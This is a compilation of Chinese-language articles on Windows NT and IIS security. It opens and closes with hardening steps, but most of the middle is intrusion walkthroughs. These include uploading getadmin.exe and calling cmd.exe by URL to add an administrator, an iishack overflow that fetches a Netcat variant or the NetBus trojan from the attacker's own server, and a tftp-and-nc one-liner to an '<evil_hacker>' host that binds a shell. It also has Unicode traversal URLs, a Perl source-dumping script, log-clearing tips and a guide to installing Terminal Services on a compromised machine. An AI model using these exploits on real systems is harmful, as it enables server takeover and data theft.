以写个net share c$ /delete的bat文件，放到机器的启动任务里。 
　　3）为系统管理员账号更名。同时把系统管理员的密码改成强加密：密码长度在10位以上，并 
且密码要包括数字、字母、！等各种字符。 
　　4）废止TCP/IP上的NetBIOS。通过网络属性的绑定选项，废止NetBIOS与TCP/IP之间的绑 
定。 
　　5）安装其他服务。应该尽量不在同台服务器上安装数据库的别的服务，如果装了的话，最主 
要一点是数据库密码不能跟系统的登陆密码一样。 
二、 设置IIS的安全机制 
　　1）解决IIS4以及之前的版本受到D.O.S攻击会停止服务。 运行Regedt32.exe 在： 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\w3svc\parameters 增加一个值： 
value Name: MaxClientRequestBuffer Data Type: REG_DWORD 设置为十进制 具体数值设置为你 
想设定的IIS允许接受的URL最大长度。CNNS的设置为256。 
　　2）删除HTR脚本映射。 
　　3）将IIS web server下的 /_vti_bin 目录设置成禁止远程访问。 
　　4）在IIS管理控制台中，点 web站点，属性，选择主目录，配置（起始点），应用程序映 
射，将htw与webhits.dll的映射删除。 
　　5）如果安装的系统是2K的话，安装Q256888_W2K_SP1_x86_en.EXE。 
　　6）删除:c:\Program Files\Common Files\System\Msadc\msadcs.dll。 
　　7）如果不需要使用Index Server，禁止或卸载该服务。 如果你使用了Index Server，请将 
包含敏感信息的目录的“Index this resource”的选项禁止。 
　　8）解决unicode漏洞： 2K安装2kunicode.exe、NT安装ntunicode86.exe。 
　　经过以上的设置之后,我还是不敢说它就完全安全了,你可不要回去睡大觉呀!不过你可以放松 
一下了! 
　　微软的产品虽然好用,但是它的漏洞和同类比起来是漏洞最多的一个.作为一个网管要时刻的 
注意新漏洞的出现,及时的采取相应的措施,做到有备无患! 
--------------------------------------------------------------------------------
send ........ 
please wait for 60 minutes !
入侵NTserver典型途径
简介 
1、如果你有NT/IIS服务器的任何一个帐号,哪怕是guest帐号,都可以获得root 
2、用netcat和iishack可以获得root 
3、iusr_计算机名这个帐号有ftp上传,web执行等权限. 
4、在web server上执行程序是入侵NT的关键 
5、要在web server上执行程序就先要上传文件到cgi-bin目录或者scripts目录等有执行权限的目 
录上去 
在本文中,目标机器的名称是ntsvr2,目标机器的域名是www.xxx.com,目标机器上有scripts和cgi- 
bin目录,scripts目录下有uploadn.asp等asp程序,可能有guest帐号,肯定有iusr_ntsvr2这个帐 
号: 
第一个方法,用iusr_ntsvr2后者guest这两个帐号,这里假设我们已经破解了这个帐号的密码: 
在浏览器输入: 
http://www.xxx.com/scripts/uploadn.asp 
guest和iusr_ntsvr2这两个帐号都可以进这个asp页面 
在这里把文件getadmin和gasys.dll以及cmd.exe上传到/scripts目录. 
然后输入:http://www.xxx.com/scripts/getadmin.exe?IUSR_ntsvr2 
大约十多秒后屏幕显示: 
CGI Error 
这时有90%的可能是:你已经把IUSR_ntsvr2升级为Administrator,也就是任何访问该web站的人都 
是管理员 
下面可以add user: 
http://www.xxx.com/cgi-bin/cmd.exe?/c%20c:\winnt\system32\net.exe%20user%20china% 
20news%20/add 
这样就创建了一个叫china用户,密码是news,然后: 
http://www.xxx.com/scripts/getadmin.exe?china 
第二个方法,用匿名ftp: 
如果允许匿名帐号ftp登陆的设定,也给我们带来了突破NT server的机会。我们用ftp登陆一个NT 
server,比如:www.xxx.com(示例名): 
ftp www.xxx.com 
Connected to www.xxx.com 
220 ntsvr2 Microsoft FTP Service (Version 3.0). 
ntsvr2这个东西暴露了其NETbios名,那么在IIS的背景下,必然会有一个IUSR_ntsvr2的用户帐号, 
属于Domain user组，这个帐号我们以后要用来获取Administrator的权限 
User (www.xxx.com:(none)):anonymous 
331 Anonymous access allowed, send identity (e-mail name) as password. 
Password: 输入 guest@ 或者guest 
对于缺乏网络安全知识的管理员来说,很多人没有将guest帐号禁止,或者没有设置密码。那么 
guest帐号就是一个可用的正确的用户帐号，虽然只属于Domain guest组 
在这种情况下我们就可以进NT server的ftp了。 
进去以后,看看目录列表,试试 cd /scripts 或cgi-bin等关键目录,如果运气好,改变目录成功， 
这时你就有了80%的把握。 
把winnt下的cmd.execopy到cgi-bin,把getadmin和gasys.dll传上去到cgi-bin 
然后输入:http://www.xxx.com/cgi-bin/getadmin.exe?IUSR_ntsvr2 
大约十多秒后屏幕显示: 
CGI Error 
这时有90%的可能是:你已经把IUSR_ntsvr2升级为Administrator,也就是任何访问该web站的人都 
是管理员 
下面可以add user: 
http://www.xxx.com/cgi-bin/cmd.exe?/c%20c:\winnt\system32\net.exe%20user%20china% 
20news%20/add 
这样就创建了一个叫china用户,密码是news,然后: 
http://www.xxx.com/cgi-bin/getadmin.exe?china 
或者 
http://www.xxx.com/scripts/tools/getadmin.exe?china 
你再用china的帐号登陆,就可以有最大的权限了,也可以用上面的cmd.exe的方法直接修改 如果没 
有cmd.exe,也可以自己传一个上去到scripts/tools或者cgi-bin目录 
第三个方法,用netcat和iishack 
如果你熟悉使用Netcat这个工具,你就知道,netcat可以利用NT的弱点在其上绑定端口,下面用eEye 
的工具已经介绍过,如果你熟悉Netcat,成功的可能性会更大: 
IIS的ISAPI的毛病(*.HTR) 我们再来看看eEye最近这两天发现的一个关于NT/IIS的问题和工具.在 
IIS的/Inetsrv目录下,有个DLL文件叫ism.dll,这个模块在web运行的时候就被加载到较高的内存 
地址,并且导致了零字节问题到处出现.IIShack.asm ,利用这个毛病,eEye写了两个程序: 
iishack.exe ncx99.exe,为达目的你必须自己有一个web server,把ncx99.exe和netbus木马传到 
这个web server的目录下,比如你的web server是: 
www.mysvr.com? 而对方的IIS server是www.xxx.com 
则: iishack www.xxx.com 80 www.mysvr.com/ncx99.exe?? (注意,不要加http://字符!) 
上述命令输入后这时你应该可以看到 
------(IIS 4.0 remote buffer overflow exploit)----------------- 
(c) dark spyrit -- barns@eeye.com. 
http://www.eEye.com 
[usage: iishack <host> <port> <url> ] 
eg - iishack www.xxx.com 80 www.mysvr.com/thetrojan.exe 
do not include 'http://' before hosts! 
--------------------------------------------------------------- 
Data sent! 
然后,再把Netbus等特洛伊木马传到对方机器上去: 
iishack www.example.com 80 www.myserver.com/netbus.exe 
ncx99.exe实际上是有名的Netcat的变种,它把对方server的cmd.exe绑定到Telnet服务 
ncx.exe 这是较早的版本,是把端口绑到80的,由于80端口跑web服务,端口已经被使用.所以可能不 
一定有效 
然后,用Telnet到对方的99或80端口: 
Telnet www.xxx.com 99 
结果是这样: 
Microsoft(R) Windows NT(TM) 
(C) Copyright 1985-1996 Microsoft Corp. 
C:\>[You have full access to the system, happy browsing :]] 
C:\>[Add a scheduled task to restart inetinfo in X minutes] 
C:\>[Add a scheduled task to delete ncx.exe in X-1 minutes] 
C:\>[Clean up any trace or logs we might have left behind.] 
这样,你就完全控制了其硬盘上的文件!注意,如果你type exit退出,对方server上的这个进程也会 
退出 
参考资料: eeye.zip 
补救方法:在IIS的www service属性中将主目录的应用程序设置的*.htr的映射删除 
微软对这个问题的正式回应 
其它:用Retina.exe得到NT域内的帐号清单,逐个尝试这些帐号,如果有的密码薄弱而被你猜出来, 
就可以用上面的方法来获取NT的admin
有关IIS 漏洞攻击的一些方法整理
1，介绍 
由于这些方法针对通过端口80来操作，所以具有一定的威胁性，因为作为WEB你 
这个口总要开的。如果你想一边抽烟一边查漏洞，OK，你下载一些CGI扫描器来 
帮助你检查，你可以尝试使用这两个： 
"whisker" by "rain forest puppy" (www.wiretrip.net/rfp). 
"cis" by "mnemonix" (www.cerberus-infosec.co.uk) 
另外你如果要知道目标机器运行的是啥类型的服务程序，你可以使用 
下面的命令： 
elnet <victim> 80 
GET HEAD / HTTP/1.0 
就可以返回一些名字和WEB服务程序版本，如果有些服务器把WEB运行在 
8080，81，8000，8001口，你就TELNET相应的口上。 
如果你要知道运行了SSL的WEB服务程序，在WEB服务器和浏览器进行了 
连接的的话，我们就可以使用工具"ssleay": 
s_client -connect <victim>:443 
HEAD / HTTP /1.0 
====================================================================== 
2,一些常用方法： 
========IIS HACK========== 
www.eeye.com的人员发现了一个IIS4.0 的缓冲溢出可以允许用户上载 
程序，如netcat到目标服务器，并把cmd.exe绑定到80口。这个缓冲溢 
出主要存在于.htr,.idc和.stm文件中，其对关于这些文件的URL请求 
没有对名字进行充分的边界检查，导致运行攻击者插入一些后门程序 
在系统中下载和执行程序。 
要检测这样的站点你需要两个文件iishack.exe，ncx.exe，你可以到下面 
的站点www.technotronic.com去下载，另外你还需要一台自己的WEB服务器， 
当然你可以是虚拟服务器哦。 
你现在你自己的WEB服务器上运行WEB服务程序并把ncx.exe放到你自己相应 
的目录下，然后使用iishack.exe来检查目标机器： 
c:\>iishack.exe <victim> 80 <your web server>/ncx.exe 
然后你就使用netcat来连接你要检测的服务器： 
c:\>nc <victim> 80 
如果溢出点正确你就可以看到目标机器的命令行提示，并且是管理远权限。 
=========MDAC- 本地命令执行=========== 
你可能认为这个漏洞太老了，可网络如此之大，可能还有好多IIS WEB服务 
器存在这个漏洞啦。IIS的MDAC组件存在一个漏洞可以导致攻击者远程执行 
你系统的命令。主要核心问题是存在于RDS Datafactory，默认情况下， 
它允许远程命令发送到IIS服务器中，这命令会以设备用户的身份运行， 
其一般默认情况下是SYSTEM用户。关于这个漏洞的描述，很多文章介绍 
的很清楚，这里不做详细解释，你如果要对自己的站点进行检查是否存在 
这个漏洞，你可以通过下面的操作： 
c:\>nc -nw -w 2 <victim> 80 
GET /msadc/msadcs.dll HTTP 
如果你得到下面的信息： 
application/x_varg 
就很有可能没有打上补丁并存在此漏洞，你可以使用rain forest puppy 
站上的两个程序进行测试(www.wiretrip.net/rfp)==>mdac.pl和msadc2.pl 。 
c:\> mdac.pl -h <victim> 
Please type the NT commandline you want to run (cmd /c assumed):\n 
cmd /c 
OK，如果你要替换对方的主页，你就可以使用下面的方法： 
cmd/c echo hacked by me > d:\inetpub\wwwroot\victimweb\index.htm 
或者其他命令，当然最好的方法我觉得还是使用上载我们的netcat，并 
把CMD.EXE绑定到端口80上，我们可以设置我们自己的TFTP服务程序并把 
nc.exe放上去，然后在执行命令，如： 
cmd/c cd %systemroot%&&tftp -i <evil_hacker> GET nc.exe&&del ftptmp 
&& attrib -r nc.exe&&nc.exe -l -p 80 -t -e cmd.exe 
然后你就连接到80口，得到一个SHELL口让你浏览。呵呵！ 
=========Codebrws.asp & Showcode.asp ================== 
Codebrws.asp和Showcode.asp在IIS4.0中是附带的看文件的程序， 
但不是默认安装的，这个查看器是如果管理员允许查看样例文件作为 
联系而安装的，但是，这个查看器没有很好的限制所访问的文件，远程 
攻击者可以利用这个漏洞来查看目标机器上的任意文件内容，但要注意 
以下几点： 
1，Codebrws.asp 和 Showcode.asp默认情况下没有安装。 
2，漏洞仅允许查看文件内容。 
3，这个漏洞不能绕过WINDOWS NT的ACL控制列表的限制。 
4，只有同一分区下的文件可以被查看(所以把IIS目录和WINNT分区安装 
是个不错的注意，也可能比较好的防止最新的IIS5.0的unicode漏洞). 
5,攻击者需要知道请求的文件名。 
例如你发现存在这个文件并符合上面的要求，你可以请求如下的命令： 
http://www.victim.com/iisamples/exair/howitworks/codebrws.asp?source =/ 
iisamples/exair/howitworks/codebrws.asp 
你就可以查看到codebrws.asp的源代码了。 
你也可以使用showcode.asp来查看文件： 
http://www.victim.com/msadc/samples/selector/showcode.asp ? 
source=/msadc/../../../../../winnt/win.ini 
当然我想也可以查看一些FTP信息来获得其他的目标器管理员经常使用的 
机器，或许他其他的机器的安全性比WEB差呢;).如： 
http://xxx.xxx.xxx.xxx/msadc/Samples/SELECTOR/showcode.asp ? 
source=/msadc/Samples/../../../../../winnt/system32/logfiles/MSFTPSVC1/ex000517.log 
=========Null.htw=============== 
IIS如果运行了Index Server的话就包含了一个通过Null.htw有关的漏洞， 
就是服务器上不存在此.htw结尾的文件。这个漏洞会导致显示ASP脚本的 
源代码，包伙global.asa里面包含了用户名和密码等敏感信息。工具者 
如果提供特殊的URL请求给IIS就可以跳出虚拟目录的限制，提供逻辑分 
区和ROOT目录的访问。这个"hit-highlighting"功能在Index Server中 
没有充分防止各种类型文件的请求，所以导致攻击者访问服务器上的任意 
文件。Null.htw功能可以从用户输入中获得3个变量： 
CiWebhitsfile 
CiRestriction 
CiHiliteType 
你可以使用下面的方法传递变量来获得如default.asp的源代码： 
http://www.victim.com/null.htw?CiWebhitsfile=/default.asp%20&%20 
CiRestriction=none%20&%20&CiHiliteType=full 
其中不需要一个合法的.htw文件是因为虚拟文件已经存储在内存中了。 
========webhits.dll & .htw================ 
这个hit-highligting功能是由Index Server提供的允许一个WEB用户在 
文档上highlighted（突出）他们原始搜索的条目，这个文档的名字通过 
变量CiWebhitsfile传递给.htw文件，Webhits.dll是一个ISAPI应用程序 
来处理请求，打开文件并返回结果，当用户控制了CiWebhitsfile参数传递 
给.htw时，他们就可以请求任意文件，结果就是导致查看ASP源码和其他 
脚本文件内容。要了解你是否存在这个漏洞，你可以请求如下条目： 
http://www.victim.com/nosuchfile.htw 
如果你从服务器端获得如下信息： 
format of the QUERY_STRING is invalid 
这就表示你存在这个漏洞。 
这个问题主要就是webhits.dll关联了.htw文件的映射，所以你只要取消 
这个映射就能避免这个漏洞，你可以在你认为有漏洞的系统中搜索.htw 
文件，一般会发现如下的程序： 
/iissamples/issamples/oop/qfullhit.htw 
/iissamples/issamples/oop/qsumrhit.htw 
/isssamples/exair/search/qfullhit.htw 
/isssamples/exair/search/qsumrhit.htw 
/isshelp/iss/misc/iirturnh.htw (这个一般为loopback使用) 
一个攻击者可以使用如下的方法来访问系统中文件的内容： 
http://www.victim.com/iissamples/issamples/oop/qfullhit.htw ? 
ciwebhitsfile=/../../winnt/win.ini&cirestriction=none&cihilitetype=full 
就会在有此漏洞系统中win.ini文件的内容。 
===ASP Alternate Data Streams(::$DATA)================== 
$DATA这个漏洞是在1998年中期公布的，$DATA是在NTFS文件系统中存储 
在文件里面的main data stream属性，通过建立一个特殊格式的URL，就 
可能使用IIS在浏览器中访问这个data stream(数据流)，这样做也就显示 
了文件代码中这些data stream(数据流)和任何文件所包含的数据代码。 
其中这个漏洞需要下面的几个限制，一个是要显示的这个文件需要保存在 
NTFS文件分区(幸好为了"安全"好多服务器设置了NTFS格式)，第二是文件 
需要被ACL设置为全局可读。而且未授权用户需要知道要查看文件名的名字， 
WIN NT中的IIS1.0, 2.0, 3.0和4.0都存在此问题。微软提供了一个FOR IIS 
3.0和4.0的版本补丁，你可以通过这文章来修补这个漏洞： 
"supporting NTFS alternate data streams by asking Windows 
NT to make the file name canonical" 
要查看一些.asp文件的内容，你可以请求如下的URL： 
http://www.victim.com/default.asp::$DATA 你就得到了源代码。你 
要了解下NTFS文件系统中的数据流问题，你或许可以看看这文章： 
http://focus.silversand.net/newsite/skill/ntfs.txt 
=========ASP Dot Bug==================== 
这个漏洞是比较早的漏洞了，是Lopht小组在1997年发现的缺陷，这个漏洞 
也是泄露ASP源代码给攻击者，一般在IIS3.0上存在此漏洞，在请求的URL 
结尾追加一个或者多个点导致泄露ASP源代码。 
http://www.victim.com/sample.asp . 
======ISM.DLL 缓冲截断漏洞=============== 
个漏洞是由Cerberus Information Security team.最早发现的，它运行 
在IIS4.0和5.0上面，允许攻击者查看任意文件内容和源代码。通过在文件 
名后面追加近230个+或者?%20?(这些表示空格)并追加?.htr?的特殊请求给IIS， 
会使IIS认为客户端请求的是?.htr?文件，而.htr文件的后缀映射到ISM.DLL 
ISAPI应用程序，这样IIS就把这个.htr请求转交给这个DLL文件，然后ISM.DLL 
程序把传递过来的文件打开和执行，但在ISM.DLL 截断信息之前,缓冲区发送 
一个截断开的 .Htr 并会有一些时间去返回一些你要打开的文件内容. 
除非 WEB 服务停止并重启过，否则这攻击只能有效执行一次。如果已经 
发送过一个 .htr 请求到机器上,那么这攻击会失效.它只能在 ISM.DLL 
第一次装入内存时工作.CNNS发现追加+号到没有一次攻击这个问题，可以进行 
多次攻击。 
http://www.victim.com/global.asa %20%20(...<=230)global.asa.htr 
==========.idc & .ida Bugs======================= 
这个漏洞实际上类似ASP dot 漏洞，其能在IIS4.0上显示其WEB目录信息， 
很奇怪的说有些还在IIS5.0上发现过此类漏洞，通过增加?idc?或者?ida? 
后缀到URL会导致IIS尝试允许通过数据库连接程序.DLL来运行.IDC，如果 
此.idc不存在，它就返回一些信息给客户端。 
http://www.victim.com/anything.idc 或者 anything.idq 
============+.htr Bug=========================== 
这个漏洞相似由NSFOCUS发现的，对有些ASA和ASP追加+.htr的URL请求 
就会导致文件源代码的泄露： 
http://www.victim.com/global.asa+.htr 
===========NT Site Server Adsamples 漏洞====== 
通过请求site.csc，一般保存在/adsamples/config/site.csc中，攻击者 
可能获得一些如数据库中的DSN，UID和PASS的一些信息，如： 
http://www.victim.com/adsamples/config/site.csc 
==========存在的一些暴力破解威胁.htr程序=========== 
IIS4.0中包含一个有趣的特征就是允许远程用户攻击WEB服务器上的用户 
帐号，就是你的WEB服务器是通过NAT来转换地址的，还可以被攻击。 
每个IIS4.0安装的时候建立一个虚拟目录/iisadmpwd，这个目录包含多个 
.htr文件，匿名用户允许访问这些文件，这些文件刚好没有规定只限制 
在loopback addr(127.0.0.1)，请求这些文件就跳出对话框让你通过WEB 
来修改用户的帐号和密码。这个目录物理映射在下面的目录下： 
c:\winnt\system32\inetsrv\iisadmpwd 
Achg.htr 
Aexp.htr 
Aexp2.htr 
Aexp2b.htr 
Aexp3.htr 
Aexp4.htr 
Aexp4b.htr 
Anot.htr 
Anot3.htr 
这样，攻击者可以通过暴力来猜测你的密码。如果你没有使用这个服务，你 
就豪不客气的删除这个目录先。 
=============Translate:f Bug ==================== 
Daniel Docekal在2000，8月15号发布了这个漏洞，(www.securityfocus.com/bid/1578) 
其问题是存在OFFICE 2000和FRONTPAGE 2000Server Extensions中的WebDAV中， 
当有人请求一个ASP/ASA后者其他任意脚本的时候在HTTP GET加上Translate:f 
后缀，并在请求文件后面加/就会显示文件代码，当然在没有打WIN2K SP1补丁 
为前提。这个是W2K的漏洞，但由于FP2000也安装在IIS4.0上，所以在IIS4.0 
上也有这个漏洞，你可而已使用下面的脚本来利用这个漏洞： 
############################# 
use IO::Socket; # 
my ($port, $sock,$server); # 
$size=0; # 
############################# 
# 
$server="$ARGV[0]"; 
$s="$server"; 
$port="80"; 
$cm="$ARGV[1]"; 
&connect; 
sub connect { 
if ($#ARGV < 1) { 
howto(); 
exit; 
} 
$ver="GET /$cm%5C HTTP/1.0 
Host: $server 
Accept: */* 
Translate: f 
\n\n"; 
my($iaddr,$paddr,$proto); 
$iaddr = inet_aton($server) ││ die "Error: $!"; 
$paddr = sockaddr_in($port, $iaddr) ││ die "Error: $!"; 
$proto = getprotobyname('tcp') ││ die "Error: $!"; 
socket(SOCK, PF_INET, SOCK_STREAM, $proto) ││ die "Error: 
$!"; 
connect(SOCK, $paddr) ││ die "Error: $!"; 
send(SOCK, $ver, 0) ││ die "Can't to send packet: $!"; 
open(OUT, ">$server.txt"); 
print "Dumping $cm to $server.txt \n"; 
while(<SOCK>) { 
print OUT <SOCK>; 
} 
sub howto { 
print "type as follows: Trans.pl www.victim.com codetoview.asp \n\n"; 
} 
close OUT; 
$n=0; 
$type=2; 
close(SOCK); 
exit(1); 
} 
你可以使用下面的方法来获得源代码： 
Trasn.pl www.victim.com default.asp 
=============IIS存在的Unicode解析错误漏洞==================== 
NSFOCUS安全小组发现微软IIS 4.0和IIS 5.0在Unicode字符解码的实现中存在 
一个安全漏洞，导致用户可以远程通过IIS执行任意命令。当IIS打开文件时， 
如果该文件名包含unicode字符，它会对其进行解码，如果用户提供一些特殊 
的编码，将导致IIS错误的打开或者执行某些web根目录以外的文件。此文摘自 
http://www.nsfocus.com/sa-06.htm ，你可以看到里面更详细的描述。 
你可以使用下面的方法利用这个漏洞： 
(1) 如果系统包含某个可执行目录，就可能执行任意系统命令。下面的URL可能 
列出当前目录的内容： 
http://www.victim.com/scripts/ ..%c1%1c../winnt/system32/cmd.exe?/c+dir 
(2) 利用这个漏洞查看系统文件内容也是可能的： 
http://www.victim.com/a.asp/ ..%c1%1c../..%c1%1c../winnt/win.ini 
当然这是针对中文IIS，你也可以使用"%c0%af"或者"%c1%9c"来测试英文IIS版本， 
主要原因是其编码的不同而已。 
当然，还有其中一些漏洞可以供大家来测试，我不能一一举例出来，大家有心的话 
可以出个关于IIS的漏洞记录一个，这样你的数据库就比较充足了，写的仓促，希望 
大家见谅其中的错误。
关于在浏览器中执行*.exe文件的深入探讨
一：真的能在浏览器中执行命令文件吗？ 
　　答案是肯定的。（哇，酷耶！可以......）不过先别高兴，只能执行服务器端的，而且是必 
须经过授权的。否则服务器想黑你就太容易了。谁敢看我我就格式化谁。（真希望可以，老是黑 
客黑服务器，也该服务器黑别人了。哈哈！） 
二：他是如何实现的。是靠asp文件吗？ 
　　在服务器端执行文件是靠SSI来实现的，SSI时服务器端包含的意思（不是SSL），我们经常使 
用的#include 就是服务器端包含的指令之一。不过，这次要介绍的就是---------#exec。就是他 
可以实现服务器端执行指令。 
　　不过，这次他不能用于.asp的文件。而只能用.stm、.shtm 和 .shtml这些扩展名。（很熟悉 
吧）而能解释执行他们的就是Ssinc.dll。所以，你写好的代码必须保存成.stm等格式才能确保服 
务器能执行。 
三：如何执行呢？ 
　　终于开始讨论实质性问题了。 
　　它的语法是：<!-- #exec CommandType = CommandDescription --> 
CommandType是参数，他有两个可选类型： 
1.CGI 运行一个应用程序。如 CGI 脚本、ASP 或 ISAPI 应用程序。 
　CommandDescription 参数是一个字符串。此字符串包含应用程序的虚拟路径，　后跟一个问号 
以及传送给应用程序的任一参数，参数之间由加号分隔 (+)。 
　 　他可是#exec命令最有用的参数，也是#exec命令存在的大部分理由。他可以处理已授权的CGI脚 
本，或Isapi应用程序。微软为了向下兼容一些早期的ISAPI应用程序，而创建了该项命令。我们 
知道，微软早期的WEB应用程序都是靠ISAPI解释的，而且也兼容CGI程序。你现在也可以在你的 
WEB根目录中找到CGI-BIN的目录。 
　我们可以用一下例子说明。 
　<!-- #exec cgi="/CGI-BIN/chat.exe?user+passw" --> 
　这种命令我们在一些UNIX主机上可以经常见到。现在，我们也可以在自己的.shtml中运用他 
了。当然，如果服务器允许的话。 
　还有一种类型的程序： 
<!-- #exec cgi="/CGI-BIN/login.dll?name" --> 
　这种命令方式将启动一个进程外的程序来解释并动态输出信息到网页上。这种方式不常见。但 
你仍然可以在一些网站中见到。 
2.CMD参数。 
　他可是#exec命令中最可怕的参数，也是#exec命令禁止使用的大部分理由。他也是我们一些网 
友实现最终幻想的利器。可惜。要得到我们幻想的招数有些困难（如de...,fo....）。也几乎是 
不可能的。 
　一下是微软关于CMD参数的说明，你一定要读明白在试！ 
　CMD 运行 shell 命令。 CommandDescription 参数是一个字符串，其中包含 shell 命令程序 
的完整物理路径，后跟由空格分隔的任何命令行参数。如果没有指定全路经， Web 服务器将搜索 
系统路径。默认情况下，该指令是被禁用的，这是因为它会对 Web 站点造成安全方面的危险；例 
如，用户可能使用 format 命令格式化您的硬盘。 
　我本人建议关闭，因为现在微软也不推荐用这个命令。 
　不过，如果你是服务器的管理员，可以试一试。 
　你可以新建一个test.shtml的文件。 
　然后在首行设置一个命令。 
<!--#exec cmd="c:\winnt\system32\help.exe" -->　　　'NT中的一个帮助文件（没有危险）。 
或试一试！ 
<!--#exec cmd="c:\windows\command\mem.exe" -->　　　'window98下的显示内存的一个命令。 
（没有危险） 　 
然后你在该虚拟目录中将其权限设为脚本，或可执行。 
最后，你可以在浏览器中输入该地址http://localhost/xxx/test.shtml 
如果你看到浏览器中显示了他们的屏幕输入信息。那么，恭喜你。你试成功了。 
四：最终幻想！（最好不要试。如果出了问题与本人无关！本人也不解答相应的问题） 
如果我们想执行多的命令呢？那么闭上眼，往下看吧 
首先，你打开注册表编辑器（记住要先备份），然后找 
KEY_LOCAL_MACHINE\SYSTEM 
\CurrentControlSet 
\Services 
　\W3SVC4　　　　　　　'也可能是w3svc 
　 \Parameters 
选择新建一个Dword值 
SSIEnableCmdDirective 
它的两个值为0，1。下面是微软的说明。 
服务器端的 #exec cmd 命令包括可执行外壳命令。安全意识强的站点希望通过将此值设置为 0 
来关闭 #exec cmd 命令，并以此作为外加的安全防范，尤其是在允许不受信任的使用者将文件放 
置到服务器时更是如此。默认状态下，注册表中不存在此值；要允许该命令执行外壳命令，必须 
先创建此值并将值设置为 1 。 
还可以在添一个Dwordd值 
AllowSpecialCharsInShell 
它的两个值为0，1。下面是微软的说明。 
范围： 0, 1 
默认值： 0 (禁用) 
本值控制在运行批处理文件（ .bat 和 .cmd 文件）时，是否允许在命令行使用　[ │ ( , ; % 
< > ) 等 Cmd.exe 特殊字符。这些特殊字符可能引发严重的安全隐患。如果该项值设置为 1，心 
怀叵测的用户可以在服务器上随意执行命令。因此，强力推荐用户保留其默认设置 0。默认情况 
下，这些特殊字符不能传递到脚本映射 CGI 程序。如果设置为 1，除了管道符号 │ 和标准 I/O 
重定向符（< 和 >）之外（这两类字符在命令处理器中具有特殊含义），这些特殊字符都能够传 
递到脚本映射 CGI 程序。 　 
哈哈，下面我就不详述了。 
不过你要执行一些你希望的命令可不是这么简单 
(如：<!--#exec cmd="c:\winnt\system32\format.com /y a:" -->) 
你不会成功的，如果死机不要怨我。
解决在肉鸡上安装终端服务时需要源文件的问题！
当你通过漏洞得到一台主机的时候，你一定希望能更好的控制它，你会详尽很多办法，冰河、netspy还有一些其它的后门，可是过了几天你发现被管理员发现了，或者被杀毒软件杀掉了。这时你应该想到了微软的终端服务，有很多文章介绍过如何在命令行下安装终端服务，可是安装终端服务的时候是需要windows的安装文件的，如果该系统安装的时候是把安装文件考到硬盘上以后安装的，那么你可以顺利的利用这这些文章中提到的方法来装。可是大多数的服务器都是从光盘安装的。管理员不会一直把光盘放在光驱里。所以大多数时候是不会成功的。
这里我整理了安装终端服务所需的文件包大家可以在这里下载http://www.netsill.com/download/download.asp?Did=1965
但是有一点一定要在对方的图形界面下，比如Dameware。把该文件包下载到肉鸡上解压缩，安装终端服务的时候当提示你插入安装潘的时候，你点击浏览找到解压后的文件就可以了。
下面把命令行下安装终端服务的方法也介绍给大家，但是这种情况必须在能找到默认安装文件的情况下。
首先,映射远程主机系统盘为本地磁盘 假设我们已经拿到了管理员密码。
net use x:\\***.***.***.***\c$ passwd /user:administrator
命令成功完成。 
然后转到x,检查 
Z:\Documents and Settings\All Users\「开始」菜单\程序\管理工具> 
里是否有 "终端服务管理器"和"终端服务配置"的快捷方式文件 
如有已安装服务组件的会有,或者我们telnet 对方的3389端口，如果返回一个没有提示的黑屏幕说明对方开着3389端口，也就是说开着终端服务，反之会告诉你找不到网络路径。
这里假设对方没有安装终端服务组件,我们可以进入下一步: 
telnet登陆对方主机,准备安装服务组件（如何开启远程机器的telnet请参阅相关文章）。

telnet ***.***.***.***
输入用户名/密码 
*=============================================================== 
欢迎使用 Microsoft Telnet 服务器。 
*=============================================================== 
C:\> 
进入后,再次检查终端组件是否安装: 
c:\>query user 
这个工具需要安装终端服务. 
这样就进一步确定了组件没有被安装.如果返回: 
USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME 
如果显示这样说明已经安装终端服务。
接下来是安装终端服务的几行命令。
c:\>echo [Components] > c:\song
c:\>echo TSEnable = on >> c:\song
以上两句是创建安装终端服务的应答文件。song为文件名可任意。
然后执行安装。
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\song /q /r
上面的/r参数可以根据情况看是否添加，如果加该参数的话机器会在运行瓦男装程序后自动重起。也可以不加等管理员的下次重起。
重新启动后你就可以连接到对方的中断服务了。
如何修改注册表确保系统安全
禁止管理共享 
;对于服务器而言： 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters] 
"AutoShareServer" =dword:00000000 

;对于工作站而言： 
;禁止管理共享 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters] 
"AutoShareWks " =dword:00000000 

; 关闭ntfs 8.3短文件名 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Filesystem] 
"NtfsDisable8dot3NameGeneration"=dword:00000001 

; 限制对ipc$的匿名连接 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA] 
"RestrictAnonymous"=dword:00000001 

; 使能SMB签名 
; 1st option == server 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" 
"RequireSecuritySignature"=dword:00000001 

; ---------------------------------------------------------- 
; 2nd option == client 
][HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Rdr\Parameters] "RequireSecuritySignature"=dword:00000001 

; -------------------------------------------------------------- 
; 修改过的SMB客户端使NT存在"Pass the Hash"安全漏洞 
; 一个被篡改过的SMB客户端程序可以通过传递用户名和 
; 不异常响应的验证过的账号的LanMan哈希数访问共享的SMB主机 
; 更详细的信息可以参考http://www.securityfocus.com 

[HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\LSA] 
"LMCompatibilityLevel"=dword:00000004 

; 解决NT的LSA DoS (幻影)安全漏洞 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\AeDebug] 
"Auto"="0" 

; 禁止IP源路由 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters] 
"DisableIPSourceRouting"=dword:0000001 

; 设置MDAC运行 安全 [1] / 非安全 [0] 模式 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\DataFactory\HandlerInfo] 
"HandlerRequired"=dword:00000001 

; 禁止Lan Manager验证 0 - 同时发送WinNT和Lan Manager密码格式 
; 1 - 如果服务器请求才发送NT和Lan Manager密码格式 2 - 只发送NT密码格式 
